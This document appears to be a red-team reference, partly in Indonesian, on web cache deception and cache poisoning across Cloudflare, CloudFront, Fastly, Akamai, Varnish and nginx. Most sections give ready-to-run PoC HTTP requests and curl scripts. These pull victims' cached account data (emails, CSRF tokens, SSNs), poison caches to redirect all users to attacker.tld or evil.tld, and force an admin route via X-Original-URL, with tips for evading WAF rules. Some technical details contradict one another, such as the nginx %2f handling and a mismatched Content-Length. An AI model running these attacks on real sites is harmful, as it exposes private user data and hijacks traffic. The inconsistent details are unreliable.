# cache — web

# Web Cache Deception & Poisoning — Red Team Reference

## 1. Model Mental: Dua Bug Berbeda

| | Cache Deception | Cache Poisoning |
|---|---|---|
| Victim | 1 user (session) | All users (stored) |
| Bug utama | Origin route ≠ cache key | Cache key ≠ what's stored |
| Example | `/account.css` is routed to `/account`, but cached as `.css` | `X-Forwarded-Host` header not in key but used by origin |
| Detection | Compare `X-Cache: HIT` with response body | Reflected header in body/redirect with `X-Cache: HIT` |

**Golden rule:** `cache_key = f(method, URL, Vary headers)` at CDN; `route = g(path)` at origin. Gap = `f` and `g` disagree.

---

## 2. Path Confusion

### 2.1 Semicolon / Path Parameters (`;`, `%3b`)

Origin Rails/Java (Tomcat) strips `;` as matrix param; CDN does not.

```http
GET /account;foo=bar.css HTTP/1.1
Host: target.tld
Cookie: session=<victim>
```

- **Origin (Tomcat 9/10, Rails 7):** route `/account` → 200 + PII
- **CDN (Cloudflare/CloudFront default):** key = `/account;foo=bar.css` → HIT on next request
- **Why:** Tomcat `getServletPath()` strips `;jsessionid`; Cloudflare does not normalize `;` in versions < 2023-11 (patch `NormalizeURL`)

### 2.2 Encoded Slash `%2f` and `%00`/`%0d`/`%0a`

| Payload | Origin sees | CDN key | Result |
|---|---|---|---|
| `/static/..%2faccount` | `/account` (nginx proxy_pass decoded) | `/static/..%2faccount` | Class cache poison via path confusion |
| `/account%00.css` | `/account` (PHP < 5.3.4 historically; modern: 400) | literal | Cek manual |
| `/account%0d%0a.css` | `/account` (some frameworks trim CRLF) | literal `%0d%0a` | Rare, check origin writeup |
| `/account%2Fstyle.css` | Tomcat `%2F` **rejected** (400) if `allowEncodedSlash=false` (default) | literal | **Failed** — important to note |

Reference version: Tomcat 10.1 default `allowEncodedSlash=false`, `encodedSolidusHandling=reject`. nginx 1.25 `merge_slashes on` (default), but `%2f` is **not** decoded in `proxy_pass` → forwards literal.

### 2.3 Extension Suffix (klasik PortSwigger)

```http
GET /profile/nonexistent.css HTTP/1.1
Host: target.tld
Cookie: session=victim
```

Requirements for success:
- Origin uses **route fallback** (Spring `/**`, Rails catch-all, Express `app.get('*')`) → `/profile/nonexistent.css` handled by `/profile` handler
- CDN (`*.css` rule) → `Cache-Control: max-age=…`, key = URL penuh
- Attacker requests same path **without cookie** → `X-Cache: HIT` + victim PII

Cek header: `X-Cache: HIT`, `cf-cache-status: HIT`, `x-cache: Hit from cloudfront`, `x-served-by: cache-XXX`, `server-timing: cdn-cache;desc=HIT`.

---

## 3. Unkeyed Headers (Cache Poisoning)

Header **used by origin** but **not in cache key** = poison channel.

| Header | Common origin effect | Cache key? (default) | Version notes |
|---|---|---|---|
| `X-Forwarded-Host` | Absolute URL in redirect/meta/Link | ❌ | Rails, Django `USE_X_FORWARDED_HOST` |
| `X-Host` | Sama (framework alternatif) | ❌ | Express `req.hostname` bila `trust proxy` |
| `X-Forwarded-Scheme` | Redirect HTTP→HTTPS | ❌ | Symfony, banyak reverse proxy |
| `X-Original-URL` | Path override (Symfony, Sitecore, Apache Tomcat rewrite) | ❌ | Klasik Sitecore CVE-2019-9874 family |
| `X-Rewrite-URL` | Idem | ❌ | mod_rewrite rule |
| `X-HTTP-Method-Override` | Method swap (`GET`→`DELETE`/`PUT`) | ❌ | Rails, Spring, DRF |
| `X-Forwarded-Proto` | Kong/Nginx absolute scheme | Often **keyed** in Cloudflare 2024+ | Check first |

### PoC: Host-header cache poison

```http
GET / HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld
X-Forwarded-Scheme: http
```

Cached response:

```
HTTP/1.1 301 Moved Permanently
Location: https://attacker.tld/
Cache-Control: public, max-age=600
X-Cache: HIT
```

Verification:

```bash
curl -sI https://target.tld/ | grep -Ei 'x-cache|location'
# kalau HIT + location attacker.tld → semua user redirect
```

### PoC: X-Original-URL route override

```http
GET /does-not-exist HTTP/1.1
Host: target.tld
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

If origin (Symfony < 5.4 without `framework.trusted_proxies`, or certain Sitecore) rewrites → 200 admin panel cached at `/does-not-exist`.

---

## 4. Fat GET

GET with body. Body is usually **not** in cache key, but framework (Express `urlencoded`, PHP only populates `$_GET` for GET — body **ignored**; Rails `action_dispatch` ignores GET body by default) can **parse** body into params.

```http
GET /graphql?op=publicStats HTTP/1.1
Host: target.tld
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

query={__typename} &operationName=leakSecrets
```

- CDN key = `GET /graphql?op=publicStats`
- Origin (GraphQL-over-HTTP, many JS libs that read `req.body` for GET) selects `operationName` from body → executes `leakSecrets`
- CDN range historically vulnerable: **Fastly** (GET body ignored in cache key pre-2022, now default reject), **Varnish 6.x** before `vcl_recv { if (req.method == "GET" && req.http.Content-Length) { return (synth(400)); } }`

**Test cepat:**

```bash
curl -s -X GET https://target.tld/api/x \
  -H 'Content-Length: 22' --data 'action=private&a=1' -D-
# perhatikan: X-Cache: HIT & respons berbeda vs tanpa body
```

---

## 5. Parameter Cloaking / Delimiter Quirks

Two different parsers (WAF/CDN vs origin) → which param "wins".

| Technique | URL | CDN/WAF takes | Origin takes |
|---|---|---|---|
| Duplikat | `?a=1&a=2` | pertama | Rails **terakhir**, PHP **terakhir**, Express **array** |
| Delimiter | `?a=1;b=2` | `a=1;b=2` (literal) | PHP `arg_separator.input = "&"` default → literal (fails); Rails does not split `;` |
| Delimiter | `?a=1%26b=2` | decode → `a=1&b=2` in app | same |
| Encoded %00 | `?a=admin%00&role=guest` | `a=admin%00` | C intact (`strlen` at NUL) — historical
| Case | `?Role=admin&role=user` | case-sensitive | PHP case-sensitive, ASP.NET **case-insens** → duplikat |

### PoC: duplicate-param cache poison (Nginx `$arg_` first vs origin last)

```http
GET /api/render?theme=light&theme=dark HTTP/1.1
Host: target.tld
```

- Nginx `$arg_theme` = `light` (if used in custom key)
- Origin (PHP `< 8`, Rails) = `dark`
- Third-party cache key (e.g. Fastly VCL custom `req.url` = full string) → issue if there is VCL that reconstructs URL from first param.

### PoC: Rails array param poisoning

```http
GET /search?user_id=1&user_id=2 HTTP/1.1
```

Rails `params[:user_id]` = `["1","2"]` → 500 if `to_i` strict, or `[0]` used → logic mismatch vs CDN cache key which is literal string.

---

## 6. Cache Key Normalization per CDN — Cheat Sheet

Column "Normalize" = what CDN normalizes before hashing key.

| CDN | Default key | Normalize | `%2F` | `%00` | `;` | Duplicate `&` | Version notes |
|---|---|---|---|---|---|---|---|
| **Cloudflare** | scheme+host+path+query (query **not** sorted until 2023) | percent-decode **path invalid chars** | decoded | rejected | kept | kept | Cache Rules 2024 adds optional `sort query`; new `NormalizeURL` transform |
| **CloudFront** | path+query (all query params, case-sensitive) | limit; does not decode `%XX` | kept literal | kept | kept | kept | New `CachePolicy` replaces Forwarded Values (2021+). `Managed-CachingOptimized` **does not** forward `X-*` but origin still sees via behavior |
| **Fastly** | host+path+query | none by default; `%` decoded via `url.basename`? **no** | kept | kept | kept | kept | VCL `req.url` full string; `X-Forwarded-Host` **not** part of key — unkeyed default |
| **Akamai** | path+query; `X-Akamai-*` not keyed | **`Normalize Path`** (optional, default on for `/../`, `//`) | kept | **stripped** in some configs | kept | kept | PAPI rules; `Cache Key` behavior 2022+ can include explicit header |
| **Varnish 6/7/8** | `req.url` literal | none | kept | kept | kept | kept | Key = `hash(req.url, req.http.host)` via `vcl_hash`; default does not include any header |
| **nginx (proxy_cache)** | `$scheme$proxy_host$request_uri` | `$uri` normalized internally (`.`, `//`), `$request_uri` **not** | `$uri`=kept `%2f` | kept | kept | kept | `proxy_cache_key` default = `$scheme$proxy_host$request_uri`; change → `$uri$args` to remove normalization |

### Implikasi praktis

- **Cloudflare** < 2024: path `%2F` decoded **before** cache hash, so `/a%2Fb` = `/a/b` in key but origin can see otherwise → **classic deception**.
- **CloudFront** does not decode anything → `/account%2f.css` origin sees literal or 404; but **`.css` at the end** still enters managed cache behavior.
- **Fastly**: `X-Forwarded-Host` **unkeyed by default** → prime target for host-header poison. Check `vcl_hash` of the deployment before claiming.
- **Akamai**: cache key behavior 2022+ permissive; many enterprise properties **include** query sort → duplicate params don't break the key.
- **Varnish**: completely unkeyed — all `X-*` are plausible for poisoning **if** origin trusts them.

---

## 7. PoC Toolkit — Satu Halaman

### 7.1 Recon cache behavior

```bash
T=https://target.tld
for p in "/account" "/account.css" "/account%2f.css" "/account;.css" \
         "/account%00.css" "/Account.css" "/account/.css"; do
  printf "== %s\n" "$p"
  curl -sk -o /dev/null -D- "$T$p" | grep -Ei 'x-cache|cf-cache|server-timing|age:|cache-control'
done
```

Compare `X-Cache: HIT` vs `MISS` to distinguish the key (repeated MISS = unkeyed-able).

### 7.2 Deception end-to-end

```bash
# Victim (dengan sesi)
curl -sk -H "Cookie: session=$VICTIM" "https://target.tld/account/x.css" -o /dev/null
# Attacker
curl -skI "https://target.tld/account/x.css" | grep -E 'X-Cache|cf-cache'
curl -sk  "https://target.tld/account/x.css" | grep -i 'email\|csrf\|ssn'
```

### 7.3 Poisoning (host header)

```bash
curl -sk "https://target.tld/?cb=$RANDOM" \
  -H "X-Forwarded-Host: evil.tld" \
  -H "X-Forwarded-Scheme: http" -D-

# Verifikasi tanpa header
curl -skI "https://target.tld/?cb=$RANDOM" | grep -Ei 'location|x-cache'
```

Use a **unique `?cb=` per attempt** so you don't poison the global production key during initial tests; only after confirmation, test on the target path.

### 7.4 Fat GET

```bash
curl -s -X GET "https://target.tld/api" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'action=internal&token=' -D-
```

### 7.5 Parameter cloaking

```bash
curl -s "https://target.tld/p?a=public&a=private" -D- | grep X-Cache
curl -s "https://target.tld/p?a=public%A0&a=private" -D-   # non-breaking space
curl -s "https://target.tld/p?a=public;dummy=1" -D-
```

### 7.6 Fingerprint CDN (cepat)

```bash
curl -sI https://target.tld | grep -Ei 'server:|via:|x-cache|x-amz|x-served-by|x-akamai|cf-ray|x-fastly'
```
- `cf-ray` → Cloudflare
- `x-amz-cf-id` → CloudFront
- `x-served-by: cache-XXX`, `x-fastly-request-id` → Fastly
- `x-akamai-request-id`, `akamai-grn` → Akamai
- `X-Varnish`, `Via: 1.1 varnish` → Varnish

---

## 8. Operational Pitfalls (what makes this technique fail in the field)

1. **`Vary` header present.** `Vary: Cookie` or `Vary: X-Forwarded-Host` = poison/deception **impossible** on that key. Check first:
   ```bash
   curl -sI https://t/p | grep -i '^vary'
   ```
If `Vary: Cookie` → forget classic deception for that path, look for a path where `Vary` is absent (often: `/static/*`, `/assets`).

2. **`Cache-Control: private` / `no-store`** on the target endpoint. Deception needs an endpoint that is **public-cacheable** but **contains auth state** — this combination is rare. Look for an endpoint with `Cache-Control: public` measured via response without cookie; if private → dead.

3. **Set-Cookie in response.** A CDN cache HIT does not send the original `Set-Cookie` → the victim's response loses the refresh cookie → some targets (e.g., frameworks that rotate session) break, or the CDN does **not** cache responses with `Set-Cookie` (Cloudflare: does not cache responses containing `Set-Cookie`; CloudFront: depends on `Forward Cookies` policy). Confirm via `X-Cache: HIT` **and** identical body length.

4. **CDN cache purge / short TTL.** `max-age=60` = 60-second exploit window; after that the poison is gone. Deception needs a window ≥ the time it takes a user to click. Test with the `Age:` header to ensure it's still fresh.

5. **`X-Forwarded-Host` already forwarded to origin but origin doesn't use it.** Many WAFs now set `X-Forwarded-Host` = original hostname, **overwriting** the attacker header. Check: send two headers, see which arrives (can be seen via `Host:` reflection in an error body). Cloudflare 2024+ normalizes/selects this header in some tiers.

6. **Cloudflare `Cache Rules` 2023+ default `Bypass cache on cookie`.** Many tenants enable `bypass on `__cf_bm`/session cookie → deception HIT only occurs if the request is **without** cookie (attacker), but origin needs the victim's cookie → dead. Confirm with two requests: with and without cookie.

7. **Origin `Cache-Control` override.** Even if the CDN config caches `.css`, the origin (PHP `expires`, Rails `fresh_when`, Next.js `revalidate`) can send `Cache-Control: private, no-cache` → CDN respects origin and doesn't cache. Deception needs **both** to agree to cache.

8. **Path matching case-sensitive at origin, not at CDN (or vice versa).** `Account.CSS` vs `account.css`: Akamai `Normalize Path` optionally lowercases, while Linux origin is case-sensitive → 404. This can actually be an **additional technique**, but often causes false negatives in initial tests. Always test 4 case variants + trailing dot (`account.css.` → Windows origin strips dot, CDN doesn't).

9. **Trailing dot / Windows origin.** `account.css.` on IIS/Windows 11 24H2 strips the dot; CDN key is literal → deception HIT, but Chrome 131 does **not** fetch `.css.` as a stylesheet (MIME `text/plain`) → victim isn't triggered. Needs a non-browser vector (link prefetch, image tag) or an endpoint triggered via `fetch()` in a JS app. Test MIME: `content-type` must be `text/css` for `<link>` to trigger.

10. **Chrome 131+ `SameSite=Lax` + `Sec-Fetch-Site: cross-site`.** If you trigger from an attacker domain to `target.tld/account.css`, the browser **still** sends cookies for Lax only on top-level navigation, **not** subresource `<link rel=stylesheet>` → cookie not sent → cache filled anonymously. For subresources, you need `SameSite=None` on the target (rare) or trigger via top-level navigation `<iframe>` (needs user click). This is pitfall #1 in modern engagements.

11. **HTTP/2 vs HTTP/1.1 cache key.** Some CDNs (Fastly historically) behave differently on header case in H2. `X-forwarded-host` vs `X-Forwarded-Host` in H2 is mandatorily lowercased — if origin custom-header lookup is case-sensitive (e.g., PHP `$_SERVER['HTTP_X_FORWARDED_HOST']` = uppercase, but custom Go header map is raw) → mismatch. Test via `curl --http2-prior-knowledge`.

12. **Cache key doesn't include sorted query.** If the CDN sorts query (Cloudflare Cache Rules 2024, some Akamai configs), `?a=1&b=2` = `?b=2&a=1` → the duplicate-param cloaking technique **fails**. Check with two URLs in different order, look for `X-Cache: HIT` on the second.

13. **Origin completely ignores GET body.** Fat GET only works if the framework **parses** the body on GET (Express `urlencoded` **does not by default**; `body-parser` only for `POST`/`PUT`; certain GraphQL libs do). This is the most common cause of false positives — you think it succeeded because the response is 200, when in fact the body is ignored and the parameter has no effect.

14. **In-line WAF detects `X-Original-URL`.** Cloudflare WAF managed rules (2023+) and Akamai `Command Injection` rule set block `X-Original-URL` with credential payload. Encode the header name via casing (`X-Original-url`, `x-original-URL`) — H2 lowercases, H1 can be tricked; but modern WAFs are case-insensitive. Alternative: split via `\r\n` folding only if origin is H1 and WAF is H2.

15. **Cache key includes the entire query string including semicolon.** Varnish and Fastly don't decode `;` → `/a;b.css` is keyed differently from `/a.css` → deception on `;` **fails by default** on both; it only works if origin **strips** `;` **and** the CDN **also** strips it (e.g., Cloudflare with a custom `NormalizeURL` transform 2023+). Always check `X-Cache` with both paths, don't assume.

---

## [reasoning trace]


